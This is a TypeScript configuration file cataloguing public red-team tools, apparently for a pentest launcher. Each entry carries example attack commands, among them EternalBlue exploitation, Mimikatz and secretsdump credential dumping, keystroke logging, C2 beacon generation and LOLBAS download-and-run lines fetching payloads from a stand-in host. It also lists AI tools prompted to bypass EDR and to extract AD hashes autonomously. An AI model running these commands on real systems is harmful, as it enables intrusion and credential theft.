export interface ToolParam {
  id: string;
  label: string;
  placeholder?: string;
  type: 'text' | 'ip' | 'dropdown' | 'boolean';
  options?: string[];
  defaultValue?: string;
}

export interface RedTeamTool {
  id: string;
  name: string;
  description: string;
  repo: string;
  category: 'AI' | 'Virtualization' | 'OSINT' | 'Exploitation' | 'Scanning';
  type: 'webview' | 'local';
  url?: string;
  params?: ToolParam[];
  commands?: string[];
}

export const RedTeamTools: RedTeamTool[] = [
  {
    id: 'metasploit',
    name: 'Metasploit',
    description: 'The world\'s most used penetration testing framework.',
    repo: 'https://github.com/rapid7/metasploit-framework.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'rhosts', label: 'Remote Host', placeholder: '192.168.1.0/24', type: 'text' },
      { id: 'lhost', label: 'Local Host', placeholder: '10.0.0.1', type: 'text' },
      { id: 'payload', label: 'Payload', placeholder: 'windows/x64/meterpreter/reverse_tcp', type: 'text' },
    ],
    commands: [
      'use exploit/multi/handler',
      'use auxiliary/scanner/smb/smb_ms17_010',
      'use exploit/windows/smb/ms17_010_eternalblue',
      'db_nmap -sV -sC 192.168.1.0/24'
    ]
  },
  {
    id: 'sliver',
    name: 'Sliver C2',
    description: 'Cross-platform adversary emulation/red team framework.',
    repo: 'https://github.com/BishopFox/sliver.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'profile', label: 'Profile Name', placeholder: 'http-beacon', type: 'text' },
      { id: 'format', label: 'Output Format', placeholder: 'exe', type: 'dropdown', options: ['exe', 'dll', 'elf', 'sh'] },
    ],
    commands: [
      'generate --http 10.0.0.1 --save /tmp/beacon.exe',
      'mtls --lhost 10.0.0.1',
      'sessions -i 1',
      'beacons'
    ]
  },
  {
    id: 'impacket',
    name: 'Impacket',
    description: 'Collection of Python classes for working with network protocols.',
    repo: 'https://github.com/fortra/impacket.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'script', label: 'Script', placeholder: 'psexec.py', type: 'dropdown', options: ['psexec.py', 'wmiexec.py', 'smbexec.py', 'secretsdump.py'] },
      { id: 'target', label: 'Target', placeholder: 'domain/user:pass@ip', type: 'text' },
    ],
    commands: [
      'psexec.py administrator@192.168.1.100',
      'secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100',
      'wmiexec.py domain/user:pass@target_ip'
    ]
  },
  {
    id: 'ghost',
    name: 'Ghost Framework',
    description: 'Cross-platform framework for Android remote administration.',
    repo: 'https://github.com/EntySec/Ghost.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'target', label: 'Target IP', placeholder: '192.168.1.100', type: 'text' },
      { id: 'command', label: 'Initial Command', placeholder: 'sysinfo', type: 'text' },
    ],
    commands: [
      'connect 192.168.1.100',
      'sysinfo',
      'screenshot',
      'shell'
    ]
  },
  {
    id: 'phpsploit',
    name: 'PHPSploit',
    description: 'Stealth post-exploitation framework for web-based targets.',
    repo: 'https://github.com/nilsteampassword/phpsploit.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'url', label: 'Shell URL', placeholder: 'http://target.com/shell.php', type: 'text' },
      { id: 'pass', label: 'Password', placeholder: 'password', type: 'text' },
    ],
    commands: [
      'set url http://target.com/shell.php',
      'set password pass',
      'exploit',
      'ls'
    ]
  },
  {
    id: 'mimikatz',
    name: 'Mimikatz',
    description: 'Extraction of plaintexts passwords, hash, PIN code and kerberos tickets from memory.',
    repo: 'https://github.com/gentilkiwi/mimikatz.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'command', label: 'Command', placeholder: 'sekurlsa::logonpasswords', type: 'text' },
    ],
    commands: [
      'privilege::debug',
      'sekurlsa::logonpasswords',
      'lsadump::sam',
      'crypto::certificates'
    ]
  },
  {
    id: 'powersploit',
    name: 'PowerSploit',
    description: 'Collection of Microsoft PowerShell modules for post-exploitation.',
    repo: 'https://github.com/PowerShellMafia/PowerSploit.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'module', label: 'Module', placeholder: 'Get-GPPPassword', type: 'text' },
    ],
    commands: [
      'Invoke-Mimikatz',
      'Get-GPPPassword',
      'Invoke-Portscan -Hosts 192.168.1.0/24',
      'Get-Keystrokes'
    ]
  },
  {
    id: 'powerhub',
    name: 'PowerHub',
    description: 'Post-exploitation tool for transferring and hosting files.',
    repo: 'https://github.com/Kuehne-Industries/PowerHub.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'port', label: 'Listen Port', placeholder: '8000', type: 'text' },
    ],
    commands: [
      'python3 powerhub.py',
      'set port 443',
      'load PowerUp.ps1'
    ]
  },
  {
    id: 'lolbas',
    name: 'LOLBAS',
    description: 'Living Off The Land Binaries, Scripts and Libraries.',
    repo: 'https://github.com/LOLBAS-Project/LOLBAS.git',
    category: 'Scanning',
    type: 'local',
    params: [
      { id: 'search', label: 'Binary Name', placeholder: 'CertUtil.exe', type: 'text' },
    ],
    commands: [
      'CertUtil.exe -urlcache -split -f http://at.v/x.exe',
      'Regsvr32.exe /s /u /i:http://at.v/sc.sct scrobj.dll',
      'Bitsadmin.exe /transfer myjob http://at.v/x.exe C:\\x.exe'
    ]
  },
  {
    id: 'nosqlmap',
    name: 'NoSQLMap',
    description: 'Automated NoSQL database enumeration and injection tool.',
    repo: 'https://github.com/codingo/NoSQLMap.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'url', label: 'Target URL', placeholder: 'http://target.com/api', type: 'text' },
      { id: 'method', label: 'Method', placeholder: 'POST', type: 'dropdown', options: ['GET', 'POST', 'PUT'] },
    ],
    commands: [
      'python nosqlmap.py --url http://target.com',
      '--method POST --data "user=admin"',
      '--victim 192.168.1.5'
    ]
  },
  {
    id: 'bbqsql',
    name: 'bbqsql',
    description: 'A blind SQL injection framework.',
    repo: 'https://github.com/Neohapsis/bbqsql.git',
    category: 'Exploitation',
    type: 'local',
    params: [
      { id: 'url', label: 'Target URL', placeholder: 'http://target.com/search', type: 'text' },
    ],
    commands: [
      'bbqsql -u http://target.com/search?id=1',
      '--query "SELECT user FROM users"'
    ]
  },
  {
    id: 'tgpt',
    name: 'TGPT',
    description: 'Terminal-based AI assistant for red team operations.',
    repo: 'https://github.com/aandrew-me/tgpt.git',
    category: 'AI',
    type: 'local',
    params: [
      { id: 'query', label: 'Prompt', placeholder: 'How to bypass EDR?', type: 'text' },
    ],
    commands: [
      'tgpt "What is the syntax for impacket secretsdump?"',
      'tgpt "How to use sliver to generate an mtls beacon?"'
    ]
  },
  {
    id: 'hexstrike-ai',
    name: 'Hexstrike AI',
    description: 'Sovereign AI-driven red team orchestration.',
    repo: 'https://github.com/CKissinger1988/hexstrike-ai.git',
    category: 'AI',
    type: 'local',
    params: [
      { id: 'task', label: 'Objective', placeholder: 'Perform reconnaissance on 10.0.0.1', type: 'text' },
      { id: 'autonomous', label: 'Autonomous Mode', type: 'boolean' },
    ],
    commands: [
      '--task "Full network audit"',
      '--task "Extract AD hashes" --autonomous'
    ]
  },
  {
    id: 'mobsf',
    name: 'MobSF',
    description: 'Automated mobile malware analysis framework.',
    repo: 'https://github.com/MobSF/Mobile-Security-Framework-MobSF.git',
    category: 'Scanning',
    type: 'local',
    params: [
      { id: 'file', label: 'APK Path', placeholder: '/sdcard/target.apk', type: 'text' },
    ],
    commands: [
      'python manage.py runserver 0.0.0.0:8000',
      'analyze /tmp/malware.apk'
    ]
  },
  {
    id: 'osint-framework',
    name: 'OSINT Framework',
    description: 'Directory of OSINT tools and resources.',
    repo: 'https://github.com/lockfale/OSINT-Framework.git',
    category: 'OSINT',
    type: 'webview',
    url: 'https://osintframework.com',
  },
];
